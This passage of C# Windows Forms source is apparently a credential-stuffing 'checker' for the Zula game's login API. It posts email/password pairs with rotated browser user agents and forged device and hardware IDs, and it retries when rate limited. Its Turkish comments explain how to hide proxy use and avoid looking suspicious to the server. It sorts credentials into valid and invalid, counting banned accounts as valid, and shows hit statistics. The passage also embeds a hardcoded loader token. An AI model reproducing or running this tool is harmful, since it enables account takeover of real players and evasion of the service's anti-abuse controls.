                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
            };
            string userAgent = userAgents[_random.Value.Next(userAgents.Length)];

            var request = new HttpRequestMessage(HttpMethod.Post, "https://api.zulaoyun.com/zula/login/LogOn");
            request.Headers.TryAddWithoutValidation("Host", "api.zulaoyun.com");
            request.Headers.TryAddWithoutValidation("User-Agent", userAgent);
            request.Headers.TryAddWithoutValidation("Accept", "application/json, text/plain, */*");
            request.Headers.TryAddWithoutValidation("Accept-Language", "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7");
            request.Headers.TryAddWithoutValidation("Accept-Encoding", "gzip, deflate, br, zstd");
            request.Headers.TryAddWithoutValidation("Origin", "https://zulaoyun.com");
            request.Headers.TryAddWithoutValidation("Referer", "https://zulaoyun.com/");

            // ÖNEMLI: X-Forwarded-For headerını EKLEME! Bu proxy kullandığını ele verir

            request.Headers.TryAddWithoutValidation("sec-ch-ua", "\"Google Chrome\";v=\"131\", \"Chromium\";v=\"131\", \"Not_A Brand\";v=\"24\"");
            request.Headers.TryAddWithoutValidation("sec-ch-ua-mobile", "?0");
            request.Headers.TryAddWithoutValidation("sec-ch-ua-platform", "\"Windows\"");
            request.Headers.TryAddWithoutValidation("sec-fetch-dest", "empty");
            request.Headers.TryAddWithoutValidation("sec-fetch-mode", "cors");
            request.Headers.TryAddWithoutValidation("sec-fetch-site", "same-site");
            request.Headers.TryAddWithoutValidation("Connection", "keep-alive");

            // Her proxy için sabit bir DeviceId kullan (sürekli değişen ID şüpheli)
            string deviceId = !string.IsNullOrEmpty(customDeviceId) ? customDeviceId : GenerateDeviceId();
            string hwid = !string.IsNullOrEmpty(customHWID) ? customHWID : GenerateHWID();

            if (!string.IsNullOrEmpty(proxy) && string.IsNullOrEmpty(customDeviceId))
            {
                deviceId = proxyDeviceIds.GetOrAdd(proxy, _ => GenerateDeviceId());
            }

            var loginData = new { DeviceId = deviceId, Email = email, HWID = hwid, IsCafe = "0", LoaderToken = "92vPZCLJLdEKcikYR1TW2rQODxSLHzPP4WRlw53irpXL7XvcZyXFjgRxQJjLV25WoVQUS14LIb28Jn2BBqjGD70vQ7wPV=PLmwMqTVyiKnEUmATixqmAF8fYRi8+jf98zXUMfHoQXMS9tVPJo1AVj078ScBXmtV8EVhqpPETKDdFmw2mx47/OZOyQHnkucdE/ACgyif0sv8l884xwCmBzqKno67I2B/noHAeXXvBtS", Locale = "tr", LuaId = GenerateLuaId(), Password = password, PublisherId = 1, TerminateZula = 1 };
            request.Content = new StringContent(JsonConvert.SerializeObject(loginData), System.Text.Encoding.UTF8, "application/json");

            try
            {
                var response = await client.SendAsync(request);
                var responseText = await response.Content.ReadAsStringAsync();

                // Proxy ile rate limit kontrolü
                if (responseText == "6" || responseText == "\"6\"" || (responseText.Length < 5 && responseText.Contains("6")))
                {
                    // Rate limit veya proxy bloğu - daha uzun bekle
                    await Task.Delay(1000);

                    // Yeni DeviceId ve LuaId ile tekrar dene
                    var newLoginData = new { DeviceId = GenerateDeviceId(), Email = email, HWID = GenerateHWID(), IsCafe = "0", LoaderToken = "92vPZCLJLdEKcikYR1TW2rQODxSLHzPP4WRlw53irpXL7XvcZyXFjgRxQJjLV25WoVQUS14LIb28Jn2BBqjGD70vQ7wPV=PLmwMqTVyiKnEUmATixqmAF8fYRi8+jf98zXUMfHoQXMS9tVPJo1AVj078ScBXmtV8EVhqpPETKDdFmw2mx47/OZOyQHnkucdE/ACgyif0sv8l884xwCmBzqKno67I2B/noHAeXXvBtS", Locale = "tr", LuaId = GenerateLuaId(), Password = password, PublisherId = 1, TerminateZula = 1 };
                    var retryRequest = CloneRequest(request, newLoginData);

                    try
                    {
                        var retryResponse = await client.SendAsync(retryRequest);
                        responseText = await retryResponse.Content.ReadAsStringAsync();
                    }
                    catch
                    {
                        // Retry başarısız oldu, orjinal response'u kullan
                    }
                }

                if (string.IsNullOrWhiteSpace(responseText)) return (false, "EMPTY_RESPONSE");
                if (responseText.Length < 10 && !responseText.Contains("{")) return (false, $"SHORT: {responseText}");

                try
                {
                    var json = JObject.Parse(responseText);

                    // Valid durumlar
                    if (json["ResultCode"]?.Value<int>() == 1 && json["Data"] != null) return (true, responseText);
                    string token = json["Token"]?.Value<string>();
                    string userId = json["UserId"]?.Value<string>();
                    if (!string.IsNullOrEmpty(token) && !string.IsNullOrEmpty(userId)) return (true, responseText);
                    if (json["UserLevel"] != null) return (true, responseText); // UserLevel varsa kesin başarılıdır
                    if (!string.IsNullOrEmpty(json["MemberId"]?.Value<string>())) return (true, responseText); // MemberId varsa başarılıdır
                    if (json["code"]?.Value<int>() == 0) return (true, responseText);
                    if (!string.IsNullOrEmpty(json["stok"]?.Value<string>())) return (true, responseText);
                    if (!string.IsNullOrEmpty(json["Email"]?.Value<string>())) return (true, responseText);
                    if (json["Id"]?.Value<int>() == 10) return (true, responseText);
                    if (json["Id"]?.Value<int>() == 6) return (true, responseText); // Banlı hesap (Credential doğru)
                    if (json["Success"]?.Value<bool>() == true) return (true, responseText);
                    if (json["Message"]?.Value<string>() == "1") return (true, responseText);

                    // Invalid durumlar
                    if (json["Message"]?.Value<string>() == "3") return (false, responseText);
                    if (json["ResultCode"]?.Value<int>() == 0) return (false, responseText);

                    return (false, responseText);
                }
                catch (JsonException)
                {
                    bool isValid = responseText.Contains("Token") && responseText.Contains("UserId");
                    return (isValid, responseText);
                }
            }
            catch (Exception ex) { return (false, $"ERROR: {ex.Message}"); }
        }

        private string GenerateHWID()
        {
            return Guid.NewGuid().ToString().Replace("-", "") + Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
        }

        private string GenerateDeviceId()
        {
            var bytes = new byte[6];
            _random.Value.NextBytes(bytes);
            return BitConverter.ToString(bytes).Replace("-", "").ToLower();
        }

        private string GenerateLuaId()
        {
            var r = _random.Value;
            return $"{r.Next(1000, 9999):x4}-{Guid.NewGuid().ToString().Substring(0, 8)}-{r.Next(1000, 9999):x4}-{r.Next(10000000, 99999999)}-{DateTimeOffset.UtcNow.ToUnixTimeSeconds()}-{r.Next(1000, 9999)}";
        }

        private HttpRequestMessage CloneRequest(HttpRequestMessage original, object loginData)
        {
            var request = new HttpRequestMessage(HttpMethod.Post, original.RequestUri);
            foreach (var header in original.Headers)
            {
                request.Headers.TryAddWithoutValidation(header.Key, header.Value);
            }
            request.Content = new StringContent(JsonConvert.SerializeObject(loginData), System.Text.Encoding.UTF8, "application/json");
            return request;
        }

        private void UpdateStats()
        {
            if (InvokeRequired) { Invoke(new Action(UpdateStats)); return; }
            lblTotal.Text = totalChecked.ToString();
            lblValid.Text = totalValid.ToString();
            lblInvalid.Text = totalInvalid.ToString();
            var elapsed = (DateTime.Now - startTime).TotalSeconds;
            lblSpeed.Text = elapsed > 0 ? $"{totalChecked / elapsed:F1}/s" : "0/s";
        }

        private void LogMessage(string message, Color color)
        {
            if (InvokeRequired) { Invoke(new Action(() => LogMessage(message, color))); return; }
            string timestamp = $"[{DateTime.Now:HH:mm:ss}] ";
            int start = rtbLog.TextLength;
            rtbLog.AppendText(timestamp);
            rtbLog.SelectionStart = start;
            rtbLog.SelectionLength = timestamp.Length;
            rtbLog.SelectionColor = textSecondary;
            start = rtbLog.TextLength;
            rtbLog.AppendText(message + "\n");
            rtbLog.SelectionStart = start;
            rtbLog.SelectionLength = message.Length;
            rtbLog.SelectionColor = color;
            rtbLog.SelectionStart = rtbLog.TextLength;
            rtbLog.ScrollToCaret();
            if (rtbLog.Lines.Length > 500) rtbLog.Lines = rtbLog.Lines.Skip(100).ToArray();
        }

        private void BrowseFile(TextBox target)
        {
            using (var dialog = new OpenFileDialog { Filter = "Text files (*.txt)|*.txt" })
                if (dialog.ShowDialog() == DialogResult.OK) target.Text = dialog.FileName;
        }

        private async Task CheckApiUrl()
        {
            if (string.IsNullOrWhiteSpace(txtApiUrl.Text)) { lblUrlStatus.ForeColor = errorRed; return; }
            try
            {
                using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(5) };
                var response = await client.GetAsync(txtApiUrl.Text);
                lblUrlStatus.ForeColor = (response.IsSuccessStatusCode || response.StatusCode == HttpStatusCode.MethodNotAllowed) ? successGreen : errorRed;
            }
            catch { lblUrlStatus.ForeColor = errorRed; }
        }

        private Button CreateHeaderButton(string text, int x, int y, int w, int h, Color hoverColor)
        {
            var btn = new Button { Text = text, Location = new Point(x, y), Size = new Size(w, h), BackColor = Color.Transparent, ForeColor = textPrimary, FlatStyle = FlatStyle.Flat, Font = new Font("Segoe UI", 10, FontStyle.Bold), Cursor = Cursors.Hand };
            btn.FlatAppearance.BorderSize = 0;
            btn.FlatAppearance.MouseOverBackColor = Color.FromArgb(40, hoverColor);
            btn.FlatAppearance.MouseDownBackColor = Color.FromArgb(80, hoverColor);
            return btn;
        }

        private Panel CreateModernPanel(int x, int y, int w, int h)
        {
            var panel = new Panel { Location = new Point(x, y), Size = new Size(w, h), BackColor = bgCard };
            panel.Region = new Region(GetRoundedPath(new Rectangle(0, 0, w, h), 10));
            panel.Paint += (s, e) => {
                e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
                using (var pen = new Pen(Color.FromArgb(20, 255, 255, 255), 1))
                    e.Graphics.DrawPath(pen, GetRoundedPath(new Rectangle(0, 0, w - 1, h - 1), 10));
            };
            return panel;
        }

        private Label CreateSectionLabel(string text, int x, int y) => new Label { Text = text, Location = new Point(x, y), Size = new Size(300, 20), Font = new Font("Segoe UI Semibold", 8, FontStyle.Bold), ForeColor = textSecondary, BackColor = Color.Transparent };

        private TextBox CreateModernTextBox(Control parent, int x, int y, int w, string text)
        {
            var container = new Panel { Location = new Point(x, y), Size = new Size(w, 32), BackColor = bgSecondary };
            container.Region = new Region(GetRoundedPath(new Rectangle(0, 0, w, 32), 6));
            
            var txt = new TextBox { 
                Location = new Point(10, 7), 
                Size = new Size(w - 20, 20), 
                Text = text, 
                BackColor = bgSecondary, 
                ForeColor = textPrimary, 
                BorderStyle = BorderStyle.None, 
                Font = new Font("Segoe UI", 9) 
            };
            container.Controls.Add(txt);
            parent.Controls.Add(container);
            return txt;
        }

        private Button CreateModernButton(string text, int x, int y, int w, int h, Color baseColor)
        {
            var btn = new Button { 
                Text = text, 
                Location = new Point(x, y), 
                Size = new Size(w, h), 
                BackColor = baseColor, 
                ForeColor = Color.White, 
                FlatStyle = FlatStyle.Flat, 
                Cursor = Cursors.Hand, 
                Font = new Font("Segoe UI", 9, FontStyle.Bold) 
            };
            btn.FlatAppearance.BorderSize = 0;
            
            // Region for rounded button
            btn.Paint += (s, e) => {
                btn.Region = new Region(GetRoundedPath(new Rectangle(0, 0, w, h), 8));
            };

            btn.MouseEnter += (s, e) => btn.BackColor = Color.FromArgb(Math.Min(255, baseColor.R + 30), Math.Min(255, baseColor.G + 30), Math.Min(255, baseColor.B + 30));
            btn.MouseLeave += (s, e) => btn.BackColor = baseColor;
            return btn;
        }

        private Panel CreateStatCard(string label, string value, int x, int y, int w, int h, Color accent, ref Label targetLabel)
        {
            var card = new Panel { Location = new Point(x, y), Size = new Size(w, h), BackColor = bgSecondary };
            card.Region = new Region(GetRoundedPath(new Rectangle(0, 0, w, h), 8));
            
            card.Paint += (s, e) => {
                using (var pen = new Pen(accent, 2))
                    e.Graphics.DrawLine(pen, 10, h - 5, w - 10, h - 5);
            };

            card.Controls.Add(new Label { Text = label, Location = new Point(0, 10), Size = new Size(w, 16), Font = new Font("Segoe UI", 7, FontStyle.Bold), ForeColor = textSecondary, BackColor = Color.Transparent, TextAlign = ContentAlignment.MiddleCenter });
            targetLabel = new Label { Text = value, Location = new Point(0, 26), Size = new Size(w, 35), Font = new Font("Segoe UI", 12, FontStyle.Bold), ForeColor = textPrimary, BackColor = Color.Transparent, TextAlign = ContentAlignment.MiddleCenter };
            card.Controls.Add(targetLabel);
            return card;
        }

        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new MainForm());
        }
    }
}